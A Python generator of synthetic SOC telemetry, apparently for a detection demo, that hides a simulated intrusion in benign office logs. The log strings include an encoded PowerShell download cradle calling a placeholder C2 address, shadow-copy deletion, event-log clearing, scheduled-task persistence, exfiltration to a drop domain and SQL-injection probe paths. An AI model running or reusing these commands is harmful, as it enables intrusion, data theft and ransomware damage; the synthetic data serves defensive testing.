"""Synthetic multi-source telemetry with a realistic attack chain inside benign noise.

This is the "input" of the SOC demo. Each log source keeps its own vendor-shaped format so the
ingestion layer has real work to do (JSON for Sysmon-ish events, Apache combined for web,
CSV for firewall, TSV for DNS, syslog key=value for Linux SSH).

Attack chain modelled (a common intrusion narrative, mapped to MITRE ATT&CK):
  T1595 scan -> T1110 brute force -> T1078 valid accounts -> T1059.001 PowerShell downloader
  -> T1071 beaconing -> T1003.001 LSASS access -> T1005/T1082 discovery -> T1490 shadow copy off
  -> T1053.005 persistence -> T1048/T1567 exfil -> T1486 ransomware impact
  + T1021.002 lateral SMB, T1484? no: T1078 impossible travel, T1568.002 DGA, log clearing.
"""
from __future__ import annotations

import datetime as dt
import json
import random

TZ = dt.timezone(dt.timedelta(hours=5, minutes=30))  # Asia/Kolkata, matches the audience

START = dt.datetime(2026, 9, 2, 8, 0, 0, tzinfo=TZ)

USERS = {
    "svc-backup": {"host": "SRV-BKP-01", "ip": "10.10.20.11", "privileged": True},
    "m.kumar": {"host": "WS-FINANCE-07", "ip": "10.10.31.27", "privileged": False},
    "s.devi": {"host": "WS-HR-03", "ip": "10.10.31.44", "privileged": False},
    "j.raja": {"host": "WS-ENG-12", "ip": "10.10.31.58", "privileged": False},
    "a.priya": {"host": "WS-MKT-02", "ip": "10.10.31.61", "privileged": False},
    "admin.root": {"host": "DC-01", "ip": "10.10.10.5", "privileged": True},
    "t.viswanathan": {"host": "WS-OPS-09", "ip": "10.10.31.73", "privileged": False},
}
INTERNAL = {u: v["ip"] for u, v in USERS.items()}
HOST_IP = {v["host"]: v["ip"] for v in USERS.values()}
SRV_WEB = "10.10.20.30"
SRV_FILE = "10.10.20.40"
DC_IP = "10.10.10.5"

ATT_HOST = "WS-FINANCE-07"
ATT_USER = "m.kumar"
ATT_IP = "10.10.31.27"

MALICIOUS_IP = "203.0.113.44"
SCANNER_IP = "198.51.100.23"
C2_IP = "192.0.2.99"
C2_DOMAIN = "cdn-update-service.net"
PHISH_DOMAIN = "login-secure-ms.com"
DROP_DOMAIN = "exfil-drop.cloud"
TOR_IP = "45.155.205.10"
LEGIT_SCANNER_IP = "203.0.113.77"

UA_NORMAL = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/128 Safari/537.36",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) Safari/617.2.1",
             "Mozilla/5.0 (X11; Linux x86_64) Firefox/129.0"]
UA_TOOLS = ["sqlmap/1.7.2#stable", "Nikto/2.5.0", "curl/8.5.0", "python-requests/2.32.3",
            "Mozilla/5.0 (compatible; Acunetix-WVS/14)", "Nmap Scripting Engine"]
NORMAL_PATHS = ["/", "/index.html", "/mail/inbox", "/hr/policies", "/erp/orders",
                "/erp/invoice/4412", "/finance/report", "/confluence/pages/viewpage.action",
                "/static/app.css", "/api/v1/dashboard", "/jenkins/job/build-nightly"]
METHODS = ["GET", "GET", "GET", "POST", "HEAD"]

MS_DIRS = ["C:\\Program Files (x86)\\Google\\Chrome\\Application\\",
           "C:\\Windows\\System32\\", "C:\\Program Files\\Microsoft Office\\root\\Office16\\",
           "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\"]


def _ts(t):
    return t.strftime("%Y-%m-%dT%H:%M:%S+0530")


class Gen:
    def __init__(self, seed=1337, events=8000, hours=4):
        self.r = random.Random(seed)
        self.events = events
        self.hours = hours
        self.now = START
        self.out = {"auth": [], "process": [], "web": [], "proxy": [], "firewall": [],
                    "dns": [], "ssh": []}

    # ---------- emitters ----------
    def auth(self, t, **kw):
        ev = {"@timestamp": _ts(t), "EventID": kw.pop("id", 4624),
              "Computer": kw.pop("host", ATT_HOST), "TargetUserName": kw.pop("user", "unknown"),
              "TargetDomainName": kw.pop("domain", "CORP"),
              "IpAddress": kw.pop("ip", "127.0.0.1"), "LogonType": kw.pop("logon_type", 3),
              "Process": kw.pop("process", "C:\\Windows\\System32\\lsass.exe"),
              "Workstation": kw.pop("workstation", "")}
        if kw.get("process_create"):
            ev["ProcessCreate"] = kw["process_create"]
        self.out["auth"].append({"@timestamp": _ts(t), "event.dataset": "authentication",
                                 **{k: v for k, v in ev.items()}})

    def proc(self, t, parent, child, cmdline, host=ATT_HOST, user=ATT_USER, pid=None,
             hash_val="e3b0c44298fc1c149afbf4c8996fb92427ae41e4"):
        self.out["process"].append({
            "@timestamp": _ts(t), "event.dataset": "process_creation", "EventID": 1,
            "Computer": host, "User": user, "ProcessId": pid or self.r.randint(500, 60000),
            "Image": MS_DIRS[0] + child if not child.startswith("C:") else child,
            "ParentImage": parent if parent.startswith("C:") else MS_DIRS[1] + parent,
            "CommandLine": cmdline, "Hash": hash_val,
        })

    def web(self, t, src, method, path, status, size, user="-", agent=None, host_hdr=None):
        ua = agent or self.r.choice(UA_NORMAL)
        user_field = user
        ts = t.strftime("%d/%b/%Y:%H:%M:%S +0530")
        self.out["web"].append(
            f'{src} - {user_field} [{ts}] "{method} {path} HTTP/1.1" {status} {size} '
            f'"{"https://" + host_hdr if host_hdr else "-"}" "{ua}"')

    def proxy(self, t, src, method, domain, path, status, size, proc_name=None, user=None,
              host=None, bytes_sent=None):
        self.out["proxy"].append({
            "@timestamp": _ts(t), "event.action": "http-request",
            "source.ip": src, "destination.domain": domain, "url.path": path,
            "http.request.method": method, "http.response.status_code": status,
            "network.bytes": size, "network.direction": "outbound",
            "network.transport": "tcp", "destination.ip": self.r.choice(
                ["151.101.1.69", "140.82.112.6", "172.217.16.196"]),
            "user.name": user, "host.name": host, "process.name": proc_name,
            "bytes_sent": bytes_sent if bytes_sent is not None else size,
        })

    def fw(self, t, src, dst, dport, action, proto="tcp", rule="default", nbytes=0, host=None):
        self.out["firewall"].append({
            "@timestamp": _ts(t), "action": action, "src_ip": src, "src_port":
                self.r.randint(1024, 65000), "dst_ip": dst, "dst_port": dport,
            "bytes": nbytes, "proto": proto, "rule": rule, "host": host or "", "dst_domain": "",
        })

    def dns(self, t, client, query, qtype="A", answer="", rcode="NOERROR", rbytes=64):
        self.out["dns"].append({"@timestamp": _ts(t), "client_ip": client,
                               "host": HOST_IP.get(client) and "" or "", "query": query,
                               "type": qtype, "answer": answer, "rcode": rcode,
                               "response_bytes": rbytes})

    def ssh(self, t, host, user, ip, outcome, method="password", port=22):
        action = "authentication-failure" if outcome == "failure" else "authentication-success"
        self.out["ssh"].append(
            f"{t.strftime('%b %e %H:%M:%S')} {host} sshd[{self.r.randint(400,9000)}]: "
            f'action={action} outcome={outcome} user={user} ip={ip} rport={port} method={method}')

    def dns_batch(self, t, client, domain, sub):
        self.dns(t, client, f"{sub}.{domain}", answer="" if sub.startswith("a1f3") else "1.2.3.4",
                 rcode="NXDOMAIN" if sub.startswith("a1f3") else "NOERROR")

    # ---------- phases ----------
    def benign(self):
        """Roughly the requested baseline volume of normal office noise."""
        n = self.events
        span_ms = self.hours * 3600 * 1000
        for i in range(n):
            t = START + dt.timedelta(milliseconds=int(self.r.random() * span_ms))
            u = self.r.choice(list(USERS))
            host = USERS[u]["host"]
            ip = USERS[u]["ip"]
            k = self.r.random()
            if k < 0.30:
                self.web(t, ip, self.r.choice(METHODS), self.r.choice(NORMAL_PATHS),
                         self.r.choice([200, 200, 200, 204, 301, 304, 404]),
                         self.r.randint(300, 180000), user=u)
            elif k < 0.45:
                self.proxy(t, ip, "GET", self.r.choice(
                    ["outlook.office365.com", "github.com", "docs.google.com", "stackoverflow.com",
                     "in.indeed.com", "www.zoho.com"]), "/", 200, self.r.randint(800, 900000),
                    proc_name="chrome.exe", user=u, host=host)
            elif k < 0.58:
                self.dns(t, ip, self.r.choice(
                    ["outlook.office365.com", "github.com", "docs.google.com", "corp.local",
                     "ntp.org", "www.google.co.in"]), answer="13.107.42.12",
                    rbytes=self.r.randint(48, 260))
            elif k < 0.66:
                self.auth(t, id=4624, user=u, host=host, ip=ip, logon_type=self.r.choice([2, 3, 10]))
            elif k < 0.69:
                # benign "user forgot password" noise - must NOT trigger every rule blindly
                for _ in range(self.r.randint(2, 4)):
                    t2 = t + dt.timedelta(seconds=self.r.randint(5, 90))
                    self.auth(t2, id=4625, user=u, host=host, ip=ip, outcome="failure")
            elif k < 0.80:
                exe = self.r.choice(["OUTLOOK.EXE", "excel.exe", "chrome.exe", "Teams.exe",
                                     "Acrobat.exe", "Code.exe"])
                self.proc(t, "explorer.exe", exe, f"C:\\...\\{exe}", host=host, user=u)
            elif k < 0.86:
                self.fw(t, ip, "10.10.20.40", self.r.choice([445, 139, 3389]), "allow",
                        nbytes=self.r.randint(400, 90000), host=host)
            elif k < 0.92:
                self.ssh(t, "linux-prod-01", "deploy", "10.10.20.9", "success",
                         method="publickey")
            else:
                self.fw(t, TOR_IP, SRV_WEB, 443, "allow", nbytes=self.r.randint(400, 4000))
                self.web(t, TOR_IP, "GET", self.r.choice(NORMAL_PATHS), 200,
                         self.r.randint(400, 4000))

    def recon_scan(self):
        t = START + dt.timedelta(minutes=12)
        ports = [21, 22, 25, 80, 443, 445, 1433, 3306, 3389, 5985, 8080]
        for i in range(48):
            self.fw(t + dt.timedelta(seconds=i * 3), SCANNER_IP, SRV_WEB, ports[i % len(ports)],
                    "deny", nbytes=0, rule="explicit-deny")
        # noisy web scanner
        for i, p in enumerate(["/.env", "/wp-login.php", "/phpmyadmin/index.php", "/../../etc/passwd",
                               "/?exec=/bin/bash", "/api?query=' OR 1=1--", "/.git/config",
                               "/actuator/env", "/cgi-bin/test.cgi", "/admin/login"]):
            self.web(t + dt.timedelta(minutes=2, seconds=i * 20), SCANNER_IP, "GET", p,
                     self.r.choice([404, 403, 400, 500]), self.r.randint(180, 900),
                     agent=UA_TOOLS[i % len(UA_TOOLS)])
        # Tor exit node scanning the admin surface -> must alert
        for i in range(14):
            self.fw(t + dt.timedelta(minutes=3, seconds=i * 7), TOR_IP, SRV_FILE,
                    [22, 80, 443, 445, 139, 3389, 1433, 3306, 5432, 5985, 8080, 8443, 9200, 27017][i],
                    "deny", nbytes=0, rule="explicit-deny")
        # licensed external scanner hitting a few ports -> expected false positive, filtered out
        for i in range(6):
            self.fw(t + dt.timedelta(minutes=5, seconds=i * 4), LEGIT_SCANNER_IP, SRV_WEB, 80,
                    "deny", nbytes=0, rule="rate-limit")
        return t

    def brute_force(self, after):
        t = after + dt.timedelta(minutes=8)
        accounts = [ATT_USER] * 9 + list(USERS) + ["admin", "administrator", "root", "oracle",
                                                   "svc-sql", "test", "guest"]
        span = 11 * 60
        n = 240
        for i in range(n):
            ti = t + dt.timedelta(seconds=int(span * i / n) + self.r.random())
            u = self.r.choice(accounts)
            self.auth(ti, id=4625, user=u, host=USERS.get(u, {}).get("host", "OWA-01"),
                      ip=MALICIOUS_IP, logon_type=10)
        # also against OWA via web
        for i in range(60):
            ti = t + dt.timedelta(seconds=int(span * i / n))
            self.web(ti, MALICIOUS_IP, "POST", "/owa/auth.owa", self.r.choice([401, 401, 401, 200]),
                     self.r.randint(300, 900), agent=UA_TOOLS[3])
        # ssh brute force on the linux box (syslog path)
        for i in range(25):
            ti = t + dt.timedelta(seconds=int(span * i / n))
            self.ssh(ti, "linux-prod-01", "root", TOR_IP, "failure")
        return t + dt.timedelta(seconds=span)

    def initial_access(self, after):
        t = after + dt.timedelta(seconds=45)
        self.auth(t, id=4624, user=ATT_USER, host=ATT_HOST, ip=MALICIOUS_IP, logon_type=10)
        self.web(t + dt.timedelta(seconds=6), MALICIOUS_IP, "POST", "/owa/auth.owa", 200, 12480,
                 user=ATT_USER, agent=UA_TOOLS[3])
        # first stage: obfuscated powershell downloader
        p1 = t + dt.timedelta(seconds=30)
        self.proc(p1, "outlook.exe", "powershell.exe",
                  'powershell.exe -nop -w hidden -enc JABUAGEAZQBtAEsA...AEkARQBYACAAKQ== '
                  '-Command IEX (New-Object Net.WebClient).DownloadString('
                  '"http://192.0.2.99/beacon.ps1")', hash_val="9f2c0d1a4b5e6c7d8e9f0a1b2c3d4e5f")
        self.proxy(p1 + dt.timedelta(seconds=1), ATT_IP, "GET", "192.0.2.99", "/beacon.ps1", 200,
                   98213, proc_name="powershell.exe", user=ATT_USER, host=ATT_HOST)
        self.fw(p1 + dt.timedelta(seconds=1), ATT_IP, C2_IP, 443, "allow", nbytes=98213,
                host=ATT_HOST)
        # second stage
        self.proc(p1 + dt.timedelta(seconds=9), "powershell.exe", "svchost.exe",
                  "C:\\Users\\m.kumar\\AppData\\Local\\Temp\\svcmon.exe -p 443",
                  hash_val="0a1b2c3d4e5f60718293a4b5c6d7e8f9")
        return p1

    def beaconing(self, after, minutes=55):
        t0 = after + dt.timedelta(seconds=20)
        n = int(minutes * 60 / 47)
        for i in range(n):
            ti = t0 + dt.timedelta(seconds=i * 47 + (self.r.random() - 0.5) * 4.5)
            self.proxy(ti, ATT_IP, "POST", C2_DOMAIN, "/submit/task.php", 200,
                       self.r.choice([1400, 1412, 1398, 1440, 1405]), proc_name="svcmon.exe",
                       user=ATT_USER, host=ATT_HOST, bytes_sent=self.r.choice([512, 700]))
            self.fw(ti, ATT_IP, C2_IP, 443, "allow", nbytes=1400, host=ATT_HOST)
            if i % 5 == 0:
                self.dns(ti, ATT_IP, C2_DOMAIN, answer="192.0.2.99", rbytes=96)
        return t0 + dt.timedelta(seconds=n * 47)

    def credentials_and_defense(self, after):
        t = after + dt.timedelta(minutes=2)
        for i, (parent, child, cmd) in enumerate([
            ("cmd.exe", "net.exe", "net user administrator /domain"),
            ("cmd.exe", "nltest.exe", "nltest /dclist:CORP"),
            ("cmd.exe", "systeminfo.exe", "systeminfo"),
            ("cmd.exe", "whoami.exe", "whoami /priv"),
            ("cmd.exe", "query.exe", "query session"),
            ("cmd.exe", "netsh.exe",
             "netsh advfirewall set currentprofile state off"),  # benign-ish admin noise, keep 1
        ]):
            self.proc(t + dt.timedelta(seconds=i * 34), parent, child, cmd)
        # credential dumping via direct syscall (no bad filename!) - Sysmon EventID 10
        t2 = t + dt.timedelta(minutes=4)
        self.out["auth"].append({
            "@timestamp": _ts(t2), "event.dataset": "process_access", "EventID": 10,
            "Computer": ATT_HOST, "User": "SYSTEM", "SourceImage": "C:\\PerfStats\\perfmon.exe",
            "TargetImage": "C:\\Windows\\System32\\lsass.exe", "GrantedAccess": "0x1010",
            "CallTrace": "NtReadVirtualMemory+0", "CommandLine": "perfmon.exe",
            "Process": "perfmon.exe", "TargetUserName": "-", "IpAddress": "-",
        })
        # file share discovery + SMB lateral movement to file server
        for i in range(8):
            self.fw(t2 + dt.timedelta(seconds=i * 9), ATT_IP, SRV_FILE, 445, "allow",
                    nbytes=self.r.randint(90000, 400000), host=ATT_HOST)
            self.proc(t2 + dt.timedelta(seconds=i * 9), "svcmon.exe", "cmd.exe",
                      f"dir \\\\SRV-FILE-01\\finance\\2026\\q{1 + i % 4} /s")
        # log clearing
        t3 = t2 + dt.timedelta(minutes=6)
        self.out["auth"].append({
            "@timestamp": _ts(t3), "event.dataset": "log_clearing", "EventID": 1102,
            "Computer": "DC-01", "TargetUserName": ATT_USER, "TargetDomainName": "CORP",
            "IpAddress": ATT_IP, "LogonType": 3, "Process": "wevtutil.exe",
            "Workstation": "DC-01",
            "ProcessCreate": {"ParentImage": "C:\\Users\\m.kumar\\AppData\\Local\\Temp\\svcmon.exe",
                              "Image": "C:\\Windows\\System32\\wevtutil.exe",
                              "CommandLine": "wevtutil cl Security"},
        })
        # DGA lookups
        for i in range(12):
            self.dns_batch(t3 + dt.timedelta(seconds=i * 11), ATT_IP, "a1f3-update.net",
                           f"a1f3{self.r.randint(10000, 99999)}")
        return t3

    def persistence_exfil_impact(self, after):
        t = after + dt.timedelta(minutes=3)
        # persistence: scheduled task from a temp dir
        self.proc(t, "svchost.exe", "schtasks.exe",
                  'schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "C:\\Users\\m.kumar\\'
                  'AppData\\Roaming\\svcmon.exe" /sc minute /mo 1 /f')
        self.out["auth"].append({
            "@timestamp": _ts(t + dt.timedelta(seconds=40)), "event.dataset": "sysmon_13",
            "EventID": 13, "Computer": ATT_HOST, "User": "SYSTEM",
            "TargetObject": ("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\"
                             "Schedule\\TaskCache\\Tree\\MicrosoftEdgeUpdateTask"),
            "Details": "C:\\Users\\m.kumar\\AppData\\Roaming\\svcmon.exe",
            "TargetUserName": ATT_USER, "TargetDomainName": "CORP", "IpAddress": ATT_IP,
            "LogonType": 3, "Process": "svchost.exe", "Workstation": ATT_HOST,
        })
        # exfiltration: 3 GB upload to a file drop
        big = t + dt.timedelta(minutes=9)
        for i in range(4):
            ti = big + dt.timedelta(seconds=i * 120)
            self.proxy(ti, ATT_IP, "POST", DROP_DOMAIN, f"/upload/chunk{i + 1}.zip", 200,
                       800000000, proc_name="rclone.exe", user=ATT_USER, host=ATT_HOST,
                       bytes_sent=800000000)
            self.fw(ti, ATT_IP, "185.220.101.5", 443, "allow", nbytes=800000000, host=ATT_HOST)
        # dns tunneling exfil (many huge TXT responses)
        tun = big + dt.timedelta(minutes=2)
        for i in range(30):
            self.dns(tun + dt.timedelta(seconds=i * 4), ATT_IP,
                     f"{self.r.choice(['YWJjZGVmZ2hp', 'Z2su bG1ub3A', 'cHFyc3R1di'])[:10]}"
                     f"{i:04d}.tunnel.corp-sync.example", qtype="TXT", answer="-",
                     rbytes=self.r.choice([3800, 4100, 3950, 4300]))
        # ransomware impact: mass file modification
        r = tun + dt.timedelta(minutes=4)
        base = "C:\\Users\\m.kumar\\Documents\\finance\\2026\\"
        for i in range(300):
            ti = r + dt.timedelta(seconds=i * 0.6)
            name = f"invoice_{4400 + i}"
            self.out["process"].append({
                "@timestamp": _ts(ti), "event.dataset": "file_event", "EventID": 11,
                "Computer": ATT_HOST, "User": ATT_USER,
                "TargetFilename": f"{base}{name}.locked",
                "Image": "C:\\Users\\m.kumar\\AppData\\Roaming\\svcmon.exe",
                "CommandLine": "-", "Hash": "badc0ffee0ddf00d1e23456789abcdef",
            })
            if i < 60:  # originals deleted after encryption
                self.out["process"].append({
                    "@timestamp": _ts(ti + dt.timedelta(milliseconds=150)),
                    "event.dataset": "file_event", "EventID": 23,
                    "Computer": ATT_HOST, "User": ATT_USER,
                    "TargetFilename": f"{base}{name}.xlsx",
                    "Image": "C:\\Users\\m.kumar\\AppData\\Roaming\\svcmon.exe",
                    "CommandLine": "-", "Hash": "badc0ffee0ddf00d1e23456789abcdef",
                })
            self.proc(ti, "svcmon.exe", "vssadmin.exe" if i == 3 else "svchost.exe",
                      "vssadmin.exe delete shadows /all /quiet" if i == 3 else
                      f"copy {base}{name}.xlsx {base}{name}.locked",
                      hash_val="badc0ffee0ddf00d1e23456789abcdef")
        self.out["process"].append({
            "@timestamp": _ts(r + dt.timedelta(minutes=3)), "event.dataset": "file_event",
            "EventID": 11, "Computer": ATT_HOST, "User": ATT_USER,
            "TargetFilename": f"{base}!!READ_ME_FIRST.txt",
            "Image": "C:\\Users\\m.kumar\\AppData\\Roaming\\svcmon.exe",
            "CommandLine": "-", "NewFileContents": "PAY 0.5 BTC TO DECRYPT",
        })
        self.proc(r + dt.timedelta(minutes=4), "svcmon.exe", "notepad.exe",
                  f'notepad.exe "{base}!!READ_ME_FIRST.txt"')
        # impossible travel: same account authenticating from Singapore VPN 25 min after Coimbatore
        self.auth(r - dt.timedelta(minutes=25), id=4624, user="a.priya", host="WS-MKT-02",
                  ip="103.216.220.14", logon_type=3)
        self.auth(r, id=4624, user="a.priya", host="WS-MKT-02", ip="104.28.55.10", logon_type=3)
        # decoys / expected false positives
        self.proc(r + dt.timedelta(minutes=6), "explorer.exe", "powershell.exe",
                  'powershell.exe -Command IEX (New-Object Net.WebClient).DownloadString'
                  '("https://raw.githubusercontent.com/contoso/deploy/main/setup.ps1")',
                  host="WS-ENG-12", user="j.raja")
        for i in range(30):
            self.auth(r + dt.timedelta(minutes=8, seconds=i * 18), id=4625, user="a.priya",
                      host="WS-MKT-02", ip="10.10.31.61", logon_type=2)
        return r

    # ---------- driver ----------
    def write(self, outdir, progress=None):
        import os
        os.makedirs(outdir, exist_ok=True)
        self.benign()
        t = self.recon_scan()
        t = self.brute_force(t)
        t = self.initial_access(t)
        t = self.beaconing(t)
        t = self.credentials_and_defense(t)
        self.persistence_exfil_impact(t)
        written = {}
        def _key(r):
            if isinstance(r, str):
                i, j = r.find("["), r.find("]")
                return r[i + 1:j] if 0 <= i < j else r
            return str(r.get("@timestamp") or "")
        for name in self.out:  # keep each raw file chronologically sorted, like a real log
            self.out[name] = sorted(self.out[name], key=_key)
        for name, rows in self.out.items():
            path = os.path.join(outdir, {"auth": "auth_windows.jsonl",
                                        "process": "process_create.jsonl",
                                        "web": "web_access.log", "proxy": "proxy_traffic.jsonl",
                                        "firewall": "firewall.csv", "dns": "dns_queries.tsv",
                                        "ssh": "auth.log"}[name])
            if name in ("auth", "process", "proxy"):
                with open(path, "w", encoding="utf-8") as fh:
                    for ev in rows:
                        fh.write(json.dumps(ev, default=str) + "\n")
            elif name == "web":
                with open(path, "w", encoding="utf-8") as fh:
                    fh.write("\n".join(rows) + "\n")
            elif name == "ssh":
                with open(path, "w", encoding="utf-8") as fh:
                    fh.write("\n".join(rows) + "\n")
            else:
                cols = list(rows[0].keys())
                delim = "\t" if name == "dns" else ","
                with open(path, "w", encoding="utf-8", newline="") as fh:
                    fh.write(delim.join(cols) + "\n")
                    for row in rows:
                        fh.write(delim.join(str(row.get(c, "")) for c in cols) + "\n")
            written[name] = (path, len(rows))
        if progress:
            progress(written)
        return written


def generate(outdir, events=8000, seed=1337, hours=4, progress=None):
    """Generate telemetry. Returns {source: (path, rows)}."""
    return Gen(seed=seed, events=events, hours=hours).write(outdir, progress=progress)
